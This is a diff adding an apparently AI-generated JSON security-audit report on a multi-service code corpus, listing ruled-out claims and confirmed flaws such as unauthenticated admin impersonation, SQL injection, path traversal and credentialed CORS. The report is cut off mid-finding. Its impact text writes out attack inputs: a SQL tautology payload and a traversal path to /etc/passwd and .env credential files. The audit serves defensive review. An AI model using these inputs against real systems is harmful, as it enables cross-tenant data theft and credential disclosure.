@@ -1,0 +1,2798 @@
+{
+  "provenance": {
+    "corpus": "google/mantis @ 56377ad via mantis-meta-agent",
+    "target": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/corpus-v12",
+    "arm": "mantis",
+    "run": 2,
+    "architecture": {
+      "sub_agents_spawned": 3,
+      "specialists_or_stages": [
+        "mantis-meta-agent (supervisor, this context)",
+        "mantis-history (skipped)",
+        "mantis-structural-index (skipped)",
+        "mantis-summarize (folded into supervisor + researchers)",
+        "mantis-architecture (supervisor)",
+        "mantis-threat-model (supervisor)",
+        "mantis-plan (supervisor)",
+        "mantis-researcher x3 (support-desk-api, archive-vault-vertx, promptbridge-mlflow)",
+        "mantis-researcher (supervisor, in-context: edge-fleet-salt, ledger-etl-airflow, courier_app)",
+        "mantis-dedupe (supervisor)",
+        "mantis-review (supervisor, 13 negative constraints)",
+        "mantis-critic (supervisor)",
+        "mantis-reproduce (skipped)",
+        "mantis-chain (supervisor, folded into impact text)",
+        "mantis-patch (skipped)",
+        "mantis-calibrate (supervisor)",
+        "mantis-reflect (skipped)",
+        "mantis-report (supervisor)"
+      ],
+      "ran_in_separate_context": [
+        "mantis-researcher: support-desk-api",
+        "mantis-researcher: archive-vault-vertx",
+        "mantis-researcher: promptbridge-mlflow"
+      ],
+      "fell_back_and_why": "Budget cap of three concurrent sub-agents meant one wave, not two. Wave 1 covered the three partitions the supervisor had not read (PHP, Java/Vert.x, MLflow gateway); the supervisor read edge-fleet-salt, ledger-etl-airflow and courier_app in full itself and acted as researcher for them, so the planned wave 2 was dropped rather than run. Consequence, stated plainly: those three partitions had one pair of eyes instead of two, and their findings were not independently second-opinioned the way the wave-1 partitions were reviewed by the supervisor against source. Conversely, support-desk-api effectively got two independent researchers -- the sub-agent and the supervisor, who had read it while waiting -- and they converged on the same eight findings with the same eight CWEs; the two severity disagreements (mass assignment, legacy search) were adjudicated at the critic stage and the more conservative call was taken in both. Stages 2-4 (architecture, threat model, plan) were folded into the supervisor context and written to mantis-work/workspace/kb/THREAT_MODEL.md rather than delegated, because the whole target is 3,590 lines and delegating a KB build over it would have cost more than it returned. The mantis workspace state machine (.mantis_state.json, per-finding UUID JSONs, archive/, snapshot pinning) was not materialised: this is a single-pass run with no --sync, so MODE-OFF applies, active_snapshot is absent by contract, and findings were assembled directly into the requested report file.",
+      "review_constraints_mapping": "FP-nn labels are the mantis-review skill's own thirteen negative constraints, in its order: FP-01 ignore_hypothetical_misuse, FP-02 ignore_missing_hygiene, FP-03 require_strict_reproducibility, FP-04 avoid_pedantic_linting, FP-05 no_security_flaw_stretching, FP-06 evaluate_questionable_file_paths, FP-07 ignore_resource_exhaustion_dos, FP-08 intrinsic_security_flaws, FP-09 verify_mitigations_pragmatically, FP-10 refine_code_paths_strictly, FP-11 ignore_simd_vector_padding, FP-12 ensure_source_code_coherence, FP-13 verify_attacker_control_of_source. 'HOLDS' means the constraint fires against the finding; 'DOES_NOT_HOLD' means it does not. FP-10 and FP-11 are omitted from every triage list: FP-10 is a housekeeping rule about trimming code_paths rather than a validity test, and FP-11 concerns SIMD padding contracts, which no language in this corpus has."
+    },
+    "cost": {
+      "tool_calls": 16,
+      "wall_minutes": 38
+    },
+    "stages_run": [
+      "mantis-meta-agent",
+      "mantis-summarize (folded)",
+      "mantis-architecture",
+      "mantis-threat-model",
+      "mantis-plan",
+      "mantis-researcher",
+      "mantis-dedupe",
+      "mantis-review",
+      "mantis-critic",
+      "mantis-chain (folded)",
+      "mantis-calibrate",
+      "mantis-report"
+    ],
+    "stages_skipped": [
+      "mantis-history -- the target is not a VCS repository (git rev-parse fails, no .git/.hg/.repo anywhere under TARGET), so there is no history to mine and workspace/historical_learnings.jsonl would be empty by construction.",
+      "mantis-structural-index -- the snapshot ships no workspace/helpers/query_structural_index.py and no prebuilt SCIP/Kythe index; the skill is explicitly HINT-only and degrades to grep, which is what was used. Skipping it changes no verdict.",
+      "mantis-reproduce -- offline and read-only. No PHP, JVM, Airflow, Salt master, Flutter toolchain or MLflow runtime is available, and building a sandboxed service for each of six stacks was outside the budget. No finding is marked reproduced; every status is confirmed-by-reading or probable.",
+      "mantis-patch -- the brief forbids modifying anything under TARGET, and mantis-patch writes fixes into the code root. Recommendations are given per finding instead, and no re-attack loop was run.",
+      "mantis-reflect -- the harness exposes sub-agent transcripts only as JSONL files the supervisor is instructed not to read, so per-stage trajectories could not be parsed. Per the skill's own fallback this is recorded as a missing-transcript skip rather than a silent zero-learnings pass.",
+      "mantis-researcher wave 2 -- planned as an independent second opinion on edge-fleet-salt, ledger-etl-airflow and courier_app; dropped under the budget cap after wave 1 returned. See fell_back_and_why."
+    ],
+    "ruled_out": [
+      {
+        "assertion": "SQL injection in delivery_detail via string interpolation of the delivery id into rawQuery",
+        "location": "courier_app/lib/screens/delivery_detail.dart:42",
+        "rule": "FP-09",
+        "killed_by": "deliveryId is declared final int (delivery_detail.dart:19) and the only construction sites pass int.tryParse output (main.dart:42, which returns on null) or the same typed field (delivery_detail.dart:56). Dart's type system makes the interpolation non-injectable; the mitigation pragmatically works."
+      },
+      {
+        "assertion": "Command injection in AdminController::logs, where the journal unit is concatenated into shell_exec",
+        "location": "support-desk-api/src/Controllers/AdminController.php:86",
+        "rule": "FP-13",
+        "killed_by": "Neither operand is request-controlled: $unit comes from getenv('LOG_UNIT') with a literal fallback (settings.php:38) and $lines is int-cast twice, at :83 and again at :86. No attacker ingress reaches the sink. The real defect on this endpoint is that it is unauthenticated, reported separately as CWE-306."
+      },
+      {
+        "assertion": "Column-name SQL injection through the generic Db::update writer",
+        "location": "support-desk-api/src/Support/Db.php:68",
+        "rule": "FP-09",
+        "killed_by": "The column is wrapped in backticks with every backtick stripped from the value, so injected text cannot leave the quoted identifier and MySQL rejects it as an unknown column. The abuse that does work through this path -- writing unintended columns -- is reported as CWE-915."
+      },
+      {
+        "assertion": "ORDER BY / LIMIT injection in TicketController::index",
+        "location": "support-desk-api/src/Controllers/TicketController.php:36",
+        "rule": "FP-09",
+        "killed_by": "$sort passes a strict in_array allowlist (Sanitize.php:28), $dir collapses to the literal ASC or DESC (Sanitize.php:33), and $limit is int-cast and clamped to 1..200 (TicketController.php:31). Only the status fragment on the line above is injectable."
+      },
+      {
+        "assertion": "Unrestricted file upload leading to code execution via POST /tickets/{id}/attachments",
+        "location": "support-desk-api/src/Controllers/AttachmentController.php:42",
+        "rule": "FP-09",
+        "killed_by": "Sanitize::filename is applied at :41 and holds at this call site: basename strips directory parts, the character class reduces everything outside [A-Za-z0-9._-] to underscore, and leading dots are trimmed. The storage root (settings.php:17) is outside public/, so an uploaded .php is never served."
+      },
+      {
+        "assertion": "Hardcoded database credentials in the PHP settings file",
+        "location": "support-desk-api/config/settings.php:13",
+        "rule": "FP-08",
+        "killed_by": "Checked because FP-08 keeps hardcoded secrets in scope regardless of reachability -- but these are getenv() fallbacks for local development and the password fallback is the empty string. No secret material is committed."
+      },
+      {
+        "assertion": "Stack traces disclosed to clients by the PHP error middleware",
+        "location": "support-desk-api/config/settings.php:43",
+        "rule": "FP-02",
+        "killed_by": "display_errors is driven by APP_DEBUG through FILTER_VALIDATE_BOOLEAN and defaults to false, so the shipped configuration does not leak traces. Enabling it is an operator decision."
+      },
+      {
+        "assertion": "pickle.load of a scratch cache file is an unsafe deserialization sink",
+        "location": "ledger-etl-airflow/plugins/ledger/transforms.py:41",
+        "rule": "FP-01",
+        "killed_by": "A repo-wide grep for read_cache and write_cache returns only the two definitions -- neither has a caller. Reporting it would require assuming a hypothetical future caller AND an attacker who can plant a file in the scratch directory. The tar-slip write primitive that could plant such a file is reported on its own terms as CWE-22."
+      },
+      {
+        "assertion": "dest_prefix reaches os.path.join in LedgerExportOperator without validation, giving path traversal into /mnt/finance-share",
+        "location": "ledger-etl-airflow/plugins/ledger/operators.py:94",
+        "rule": "FP-09",
+        "killed_by": "The operator reads conf['dest_prefix'] directly rather than the validated xcom, but validate_conf (reconcile.py:34-38) gates the whole DAG and rejects any prefix that is empty, over 64 characters, or not alphanumeric after removing dashes and underscores -- '..' fails isalnum(). The mitigation works; reading the raw conf instead of the xcom is a defense-in-depth note, not a finding."
+      },
+      {
+        "assertion": "Command injection in archive_report, which builds a tar command and runs it with shell=True",
+        "location": "ledger-etl-airflow/dags/reconcile.py:75",
+        "rule": "FP-09",
+        "killed_by": "Every element is passed through shlex.quote before the join, and the only caller-influenced element (dest_prefix) is additionally alphanumeric-validated upstream. The mitigation pragmatically works."
+      },
+      {
+        "assertion": "Command injection in the per-region rollup BashOperator commands",
+        "location": "ledger-etl-airflow/dags/ledger_sync.py:73",
+        "rule": "FP-01",
+        "killed_by": "The templated values are params.region and params.work_root, sourced from settings.REGIONS (a fixed tuple, settings.py:7) and an env var read at import time. No request or trigger payload reaches them."
+      },
+      {
+        "assertion": "Hardcoded sandbox basic-auth credentials demo:demo in the ledger settings",
+        "location": "ledger-etl-airflow/plugins/ledger/settings.py:27",
+        "rule": "FP-02",
+        "killed_by": "Documented at :25-26 as the vendor's published getting-started pair for a nightly-wiped shared sandbox tenant holding generated rows, and sandbox_probe (hooks.py:62) has no caller in the tree. No production credential is exposed."
+      },
+      {
+        "assertion": "Hardcoded vendor sandbox token in the Salt pillar",
+        "location": "edge-fleet-salt/pillar/fleet.sls:14",
+        "rule": "FP-02",
+        "killed_by": "Same shape: documented at :12-13 as published in the vendor's public quickstart and reaching only sandbox.fleetvendor.example, and fleetctl.sandbox_check (fleetctl.py:93) has no caller. Nothing production-bearing is disclosed."
+      },
+      {
+        "assertion": "Wildcard Access-Control-Allow-Origin on the nginx /assets/ location",
+        "location": "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:28",
+        "rule": "FP-02",
+        "killed_by": "The location serves a static widget bundle with no cookies and no session (comment at :24) and does not set Allow-Credentials, so a wildcard is the correct configuration for a CDN-cached asset path. The credentialed CORS header three locations down is on /api/ and uses a concrete origin."
+      },
+      {
+        "assertion": "Publishable map-tiles key hardcoded in the Flutter client",
+        "location": "courier_app/lib/api/client.dart:25",
+        "rule": "FP-02",
+        "killed_by": "Documented at :23-24 as scoped to the tile endpoints and embedded in the vendor's own web demo -- a publishable token by design. Any key shipped in a mobile binary is extractable, so scoping is the control, and it is in place."
+      },
+      {
+        "assertion": "MainActivity is exported with BROWSABLE intent filters, allowing any app to launch it",
+        "location": "courier_app/android/app/src/main/AndroidManifest.xml:16",
+        "rule": "FP-02",
+        "killed_by": "Export is required for the deep links the dispatch system sends by SMS to work at all. The defect is not that the activity is reachable but that the link parameters are unvalidated once inside, which is reported as CWE-200 and CWE-749."
+      },
+      {
+        "assertion": "Path traversal in the archive-vault preset download via the :name path parameter",
+        "location": "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:69",
+        "rule": "FP-09",
+        "killed_by": "readPreset uses name only as a key into an immutable three-entry map (BlobStore.java:20-23) and returns a failed future on a miss (:66). The attacker string never reaches presetRoot.resolve -- only the mapped constant filename does."
+      },
+      {
+        "assertion": "SQL injection via the sort column in MetadataRepository.listByOwner, which String.formats it into ORDER BY",
+        "location": "archive-vault-vertx/src/main/java/vault/store/MetadataRepository.java:80",
+        "rule": "FP-05",
+        "killed_by": "sort.column() can only return one of three hardcoded identifiers, and SortColumn.parse falls back to CREATED_AT for any unmatched or null input. The allowlist works; claiming a bypass would be inventing one."
+      },
+      {
+        "assertion": "alg:none or algorithm-confusion bypass in the primary archive-vault token verification path",
+        "location": "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java:39",
+        "rule": "FP-04",
+        "killed_by": "jjwt 0.12.5 with verifyWith((SecretKey) signingKey) and parseSignedClaims pins verification to the HMAC key type and rejects unsecured JWTs; requireIssuer and requireAudience are both applied. Correct library use. Expiry is likewise enforced by parseSignedClaims and was checked separately."
+      },
+      {
+        "assertion": "SQL injection in RetentionSweeper.sweep, where bucket and keepDays are concatenated into the statement",
+        "location": "archive-vault-vertx/src/main/java/vault/store/RetentionSweeper.java:43",
+        "rule": "FP-13",
+        "killed_by": "Both values come from the retention config object fed from config.json:18-22; keepDays is read with getInteger so it cannot carry SQL, and no HTTP handler writes the config. No attacker-controlled ingress."
+      },
+      {
+        "assertion": "Log forging and arbitrary blob deletion through an attacker-chosen document title and blob_key in the retention sweep",
+        "location": "archive-vault-vertx/src/main/java/vault/store/RetentionSweeper.java:58",
+        "rule": "FP-03",
+        "killed_by": "Traced the write path rather than assuming it: title and blob_key are only ever written by MetadataRepository.insert, which a grep shows has zero call sites -- ingestManifest parses and echoes without persisting. With no reachable route that stores an attacker-chosen value, neither is concretely triggerable in this tree."
+      },
+      {
+        "assertion": "SQL injection in RunbookIndex.search, which builds its statement with an f-string",
+        "location": "promptbridge-mlflow/bridge/retrieval.py:29",
+        "rule": "FP-04",
+        "killed_by": "The f-string interpolates only self.schema (from config, not the request) and int(k); collection and query travel as bound parameters, and k = int(k or self.top_k) raises on non-numeric input before reaching the string. Standard safe psycopg use."
+      },
+      {
+        "assertion": "probe_status is an SSRF sink equivalent to http_fetch",
+        "location": "promptbridge-mlflow/bridge/tools.py:74",
+        "rule": "FP-09",
+        "killed_by": "guardrails.allowed_host is called first (tools.py:69) and matches urlparse(url).hostname against an exact-match set, which defeats userinfo and fragment tricks; follow_redirects is not enabled on this client. It is also filtered out of the dispatch registry because config.yaml does not list it. The mitigation works -- the finding is on its unguarded twin."
+      },
+      {
+        "assertion": "guardrails.redact fails to mask secrets before prompts are written to the audit log",
+        "location": "promptbridge-mlflow/bridge/guardrails.py:15",
+        "rule": "FP-02",
+        "killed_by": "Best-effort redaction whose pattern list is incomplete by nature, and the gateway keys never appear in the rendered prompt or completion -- they arrive in a header and are not copied in. Enumerating missed patterns is defense-in-depth commentary."
+      },
+      {
+        "assertion": "max_tokens, top_k and repeated distinct model URIs let a caller drive unbounded cost, memory and cache churn",
+        "location": "promptbridge-mlflow/bridge/server.py:95",
+        "rule": "FP-07",
+        "killed_by": "Pure resource-exhaustion DoS, which the review constraints exclude. The security-relevant half of the cache-churn variant is already captured by the unvalidated model_uri finding."
+      },
+      {
+        "assertion": "BridgeKeyMiddleware compares client keys in a loop, leaking which key matched through response timing",
+        "location": "promptbridge-mlflow/bridge/server.py:41",
+        "rule": "FP-05",
+        "killed_by": "Each individual comparison uses hmac.compare_digest, the correct primitive; the residual signal across a two-entry dict is not a practical oracle for the key material, and claiming one would stretch a working mitigation."
+      },
+      {
+        "assertion": "Unhandled NumberFormatException on the archive-vault limit parameter",
+        "location": "archive-vault-vertx/src/main/java/vault/MainVerticle.java:132",
+        "rule": "FP-07",
+        "killed_by": "?limit=abc yields a 500 for that one request with no state corruption and no cross-request effect -- an availability nuisance the rules exclude."
+      }
+    ]
+  },
+  "findings": [
+    {
+      "title": "Entire /admin route group is registered without the auth middleware",
+      "location": {
+        "path": "support-desk-api/public/index.php",
+        "symbol": "admin route group",
+        "line": 58
+      },
+      "cwe": "CWE-306",
+      "class": "missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "public/index.php:47-55 mounts the /tickets group and chains `->add(new AuthMiddleware($pdo));` at line 55. public/index.php:58-63 mounts the /admin group with tenants/sessions/logs/impersonate and closes at line 63 with no `->add(...)` of any kind. Slim only runs middleware that is attached, so every /admin route is served to an anonymous caller. AdminController::impersonate (AdminController.php:56-74) then mints a live 30-minute session for an arbitrary `user_id` and returns the bearer secret in the response body at line 73.",
+      "impact": "An unauthenticated caller reaches POST /admin/impersonate, supplies any user_id, and receives a working bearer token bound to that user's tenant_id -- full account and tenant takeover. GET /admin/sessions and /admin/tenants leak every live session prefix, user email and tenant billing email before that.",
+      "recommendation": "Attach an authenticating + role-checking middleware to the /admin group exactly as the /tickets group does, and gate impersonate on an operator role rather than on network placement.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a missing-header hygiene item: authentication is entirely absent on a route that mints credentials."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The comment at index.php:57 claims the console is 'only published on the internal VLAN', but nothing in this tree binds, filters or enforces that; the routes are on the same Slim app and the same listener as /tickets."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "index.php:55 and index.php:63 re-read; the ->add() call is present on one group and absent on the other."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress is the HTTP request itself; body parsed at AdminController.php:58, user_id read at :59."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/public/index.php:59",
+          "support-desk-api/public/index.php:60",
+          "support-desk-api/public/index.php:61",
+          "support-desk-api/public/index.php:62",
+          "support-desk-api/src/Controllers/AdminController.php:56"
+        ],
+        "established_by": "public/index.php:58-63 -- the /admin group closes without ->add(new AuthMiddleware($pdo))",
+        "narrowed_by": ""
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api/public/index.php",
+          "for": "any middleware attached to the /admin group, or a global $app->add() that would cover it",
+          "found": "only the CORS closure at :25 and addErrorMiddleware at :39 are global; AuthMiddleware is attached to /tickets alone at :55"
+        },
+        {
+          "looked_in": "support-desk-api/src/Controllers/AdminController.php",
+          "for": "an in-controller role or token check compensating for the missing middleware",
+          "found": "nothing -- no getAttribute('role'), no token read anywhere in the file"
+        },
+        {
+          "looked_in": "support-desk-api/config/settings.php",
+          "for": "an ip allowlist or admin gate that would narrow the exposure",
+          "found": "nothing"
+        }
+      ]
+    },
+    {
+      "title": "status filter is concatenated into the SQL IN() list unescaped",
+      "location": {
+        "path": "support-desk-api/src/Support/Sanitize.php",
+        "symbol": "Sanitize::statusClause",
+        "line": 47
+      },
+      "cwe": "CWE-89",
+      "class": "sql injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "Sanitize.php:42-47 splits the caller's CSV and returns \" AND status IN ('\" . implode(\"','\", $parts) . \"')\" with no quoting, escaping or allowlist. TicketController.php:35 appends that fragment straight onto the query string, and TicketController.php:40 hands the result to Db::all as raw SQL with only the tenant bound. Every sibling helper in the same class is safe by allowlist (sortColumn:28, direction:33) which is what makes this one look reviewed.",
+      "impact": "An authenticated requester sends ?status=x') OR 1=1 -- and drops the tenant predicate, reading every tenant's tickets; a UNION payload reaches the users and api_sessions tables in the same database.",
+      "recommendation": "Bind the status values as placeholders (build '?,?,?' from count($parts)) or intersect $parts against a fixed status allowlist the way sortColumn already does.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not paranoia about a safe library -- the fragment bypasses the prepared-statement layer it is concatenated into."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no mitigation to credit: array_filter/trim remove neither quotes nor comment markers."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Sanitize.php:47 and TicketController.php:35 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: TicketController.php:26 $request->getQueryParams(), field 'status', read at :35."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Support/Sanitize.php:47",
+          "support-desk-api/src/Controllers/TicketController.php:35",
+          "support-desk-api/src/Controllers/TicketController.php:40"
+        ],
+        "established_by": "Sanitize.php:47 builds a quoted SQL literal list by string concatenation",
+        "narrowed_by": "Reachable only behind AuthMiddleware (public/index.php:55), so the attacker needs any valid low-privilege token"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api (grep statusClause)",
+          "for": "a second call site, or a caller that pre-validates the CSV",
+          "found": "exactly one call site, TicketController.php:35, with no validation before it"
+        },
+        {
+          "looked_in": "support-desk-api/src/Support/Db.php",
+          "for": "escaping or quoting inside the query helper that would neutralise the fragment",
+          "found": "nothing -- Db::all:37 prepares whatever string it is given; PDO::ATTR_EMULATE_PREPARES=false (Db.php:27) does not help a literal already in the SQL text"
+        },
+        {
+          "looked_in": "support-desk-api/config/settings.php",
+          "for": "a status allowlist analogous to 'sortable'",
+          "found": "nothing -- 'sortable' and 'fillable' exist, no status list"
+        }
+      ]
+    },
+    {
+      "title": "Attachment download builds the path from the raw URL segment while its sibling handlers sanitise",
+      "location": {
+        "path": "support-desk-api/src/Controllers/AttachmentController.php",
+        "symbol": "AttachmentController::download",
+        "line": 53
+      },
+      "cwe": "CWE-22",
+      "class": "path traversal",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "AttachmentController.php:53 does $path = $base . '/' . rawurldecode((string) $args['name']); -- no Sanitize::filename, unlike upload (:41) and remove (:71) which both call it. The route is declared with the greedy placeholder {name:.+} at public/index.php:53, so path separators survive routing, and rawurldecode additionally turns %2e%2e%2f into ../ after Slim has finished with it. Line 59 then file_get_contents($path) into the response body.",
+      "impact": "Any authenticated user reads any file the PHP process can open: GET /tickets/1/attachments/../../../../etc/passwd, or ../../config/settings.php and the .env it falls back to, which yields DB_DSN/DB_USER/DB_PASS.",
+      "recommendation": "Run the segment through Sanitize::filename like remove() does, then realpath() the result and reject anything that does not start with the ticket's attachment directory.",
+      "triage": [
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no mitigation on this path at all; the mitigation exists on the two sibling methods, which is the evidence that its absence here is the defect."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Lines 41, 53 and 71 re-read; the asymmetry is literal."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the {name:.+} route argument declared at public/index.php:53, consumed at AttachmentController.php:53."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Controllers/AttachmentController.php:53",
+          "support-desk-api/public/index.php:53"
+        ],
+        "established_by": "AttachmentController.php:53 concatenates rawurldecode($args['name']) without Sanitize::filename",
+        "narrowed_by": "Requires a valid session token (public/index.php:55); read-only -- the write paths (upload/remove) are sanitised"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api/src/Support/Sanitize.php",
+          "for": "whether filename() would have blocked this input",
+          "found": "yes -- basename() plus a [^A-Za-z0-9._-] scrub at :18-19 removes separators; download simply never calls it"
+        },
+        {
+          "looked_in": "support-desk-api/public/index.php",
+          "for": "a route constraint that would forbid slashes in {name}",
+          "found": "the opposite -- line 53 uses {name:.+} while the DELETE route at :54 uses the plain {name}"
+        },
+        {
+          "looked_in": "support-desk-api/src/Controllers/AttachmentController.php",
+          "for": "a realpath/str_starts_with containment check after the concatenation",
+          "found": "nothing -- only is_file() at :55"
+        }
+      ]
+    },
+    {
+      "title": "Ticket read and attachment handlers accept any ticket id with no tenant ownership check",
+      "location": {
+        "path": "support-desk-api/src/Controllers/TicketController.php",
+        "symbol": "TicketController::show",
+        "line": 52
+      },
+      "cwe": "CWE-639",
+      "class": "broken object level authorization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "TicketController::show queries 'FROM tickets WHERE id = ?' with [$id] only (:52-53) and never reads the tenant_id attribute that AuthMiddleware set at AuthMiddleware.php:64 -- while TicketController::update, twenty lines below, does exactly that: 'WHERE id = ? AND tenant_id = ?' with [$id, $tenant] (:106-107). AttachmentController::upload/download/remove derive their directory from (int) $args['id'] alone (:24, :52, :70) and never consult tenant_id either.",
+      "impact": "Any authenticated user of any tenant enumerates ticket ids and reads other tenants' ticket bodies, comments and requester/assignee ids, and reads, overwrites or deletes attachments belonging to other tenants. Multi-tenant isolation is the security property this service exists to provide.",
+      "recommendation": "Add the tenant predicate to show() as update() already has it, and resolve the ticket (with its tenant) before touching the attachment directory in all three attachment handlers.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical caller involved: the handler is the caller, and it is routed at public/index.php:50-54."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "AuthMiddleware is an authentication control, not an authorization one -- it sets attributes and never compares them; there is no working mitigation being stretched."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "TicketController.php:52 and :106 re-read; the two queries differ exactly as described."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the {id} route argument (public/index.php:50), read at TicketController.php:47."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Controllers/TicketController.php:52",
+          "support-desk-api/src/Controllers/AttachmentController.php:24",
+          "support-desk-api/src/Controllers/AttachmentController.php:52",
+          "support-desk-api/src/Controllers/AttachmentController.php:70"
+        ],
+        "established_by": "TicketController.php:51-54 -- the lookup is keyed on the caller-supplied id alone",
+        "narrowed_by": "Requires any valid session token; TicketController::index (:34) and ::update (:106) are correctly scoped, so the gap is per-handler, not service-wide"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api/src/Middleware/AuthMiddleware.php",
+          "for": "an authorization decision that would cover the handlers",
+          "found": "nothing -- :62-66 only attaches user_id/tenant_id/role attributes and calls the handler"
+        },
+        {
+          "looked_in": "support-desk-api/src (grep tenant_id)",
+          "for": "every place the tenant attribute is actually compared",
+          "found": "only TicketController.php:34 (index) and :106 (update); show and all of AttachmentController never reference it"
+        }
+      ]
+    },
+    {
+      "title": "PATCH /tickets/{id} writes every body key to the row; the declared fillable allowlist is never read",
+      "location": {
+        "path": "support-desk-api/src/Controllers/TicketController.php",
+        "symbol": "TicketController::update",
+        "line": 113
+      },
+      "cwe": "CWE-915",
+      "class": "mass assignment",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "TicketController.php:113 takes the whole parsed body as $changes, :114 unsets only 'id' and 'created_at', and :122 passes the remainder straight to Db::update, which turns every key into a `col` = ? assignment (Db.php:67-70). config/settings.php:32 declares 'fillable' => ['subject','body','priority'] with the comment 'Fields a requester is allowed to change on a ticket they opened' -- and a repo-wide grep for 'fillable' returns that declaration and nothing else.",
+      "impact": "A requester PATCHes {\"tenant_id\": 7} and moves his own ticket into another tenant, or sets assignee_id/requester_id/status arbitrarily. Combined with the missing tenant check on show(), tenant_id rewriting is a two-step cross-tenant data path. Calibrated down from high at the critic stage: the write is confined to a ticket the caller already owns, so it injects and tampers rather than exfiltrating; cross-tenant reading is covered by the CWE-639 finding instead.",
+      "recommendation": "Intersect $changes with $this->settings['tickets']['fillable'] before calling Db::update -- the allowlist already exists and is already loaded into $this->settings.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not defense-in-depth: the allowlist is the stated control and it is simply not wired up."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Db::update's table allowlist (Db.php:58) and backtick scrubbing (:68) are real and do work -- they stop table and identifier injection, but neither restricts which columns a requester may set."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "settings.php:32 and TicketController.php:113-122 re-read; grep confirms zero consumers of 'fillable'."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: $request->getParsedBody() at TicketController.php:113 (body parsing enabled at public/index.php:19)."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "support-desk-api/src/Controllers/TicketController.php:113",
+          "support-desk-api/src/Controllers/TicketController.php:122",
+          "support-desk-api/src/Support/Db.php:67"
+        ],
+        "established_by": "TicketController.php:113-114 -- an unset() denylist of two keys stands in for the declared allowlist",
+        "narrowed_by": "Db.php:58 confines the write to the tickets table, and :114 protects id and created_at"
+      },
+      "searched": [
+        {
+          "looked_in": "support-desk-api (grep fillable)",
+          "for": "any consumer of the declared allowlist",
+          "found": "nothing -- config/settings.php:32 is the only occurrence in the tree"
+        },
+        {
+          "looked_in": "support-desk-api/src/Support/Db.php",
+          "for": "a column allowlist inside the generic writer that would make the controller's omission harmless",
+          "found": "nothing -- WRITABLE (:17) allowlists tables only; columns come straight from the caller's array keys"
+        }
+      ]
+    },
+    {
+      "title": "CORS reflects the caller's Origin and sets Allow-Credentials: true",
+      "location": {
+        "path": "support-desk-api/public/index.php",
+        "symbol": "cors middleware closure",
+        "line": 30
+      },
+      "cwe": "CWE-942",
+      "class": "permissive cross-origin policy",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "config/settings.php:24-25 sets allow_origin '*' and allow_credentials true. public/index.php:30 turns the wildcard into a reflection -- $allow = ($configured === '*' && $origin !== '') ? $origin : $configured; -- and :33-34 emit Access-Control-Allow-Origin: <caller's origin> together with Access-Control-Allow-Credentials: true. Line 45 answers every preflight with 200. Reflected-origin plus credentials is precisely the combination the wildcard rule exists to forbid, and the reflection is what makes it legal to the browser.",
+      "impact": "Any web page a signed-in agent visits can issue credentialed cross-origin requests carrying the desk_session cookie that AuthMiddleware accepts (AuthMiddleware.php:37) and read the responses: full ticket read and PATCH-based write from an attacker's page, no token theft required.",
+      "recommendation": "Replace the reflection with a configured allowlist of partner origins, or keep the wildcard and set allow_credentials false and stop honouring the cookie fallback.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a missing hardening header; it is an added header that grants an origin it should not."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The exploit needs no misuse by another component -- a browser executes it against the deployed config as written."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "index.php:28-36 and settings.php:21-28 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
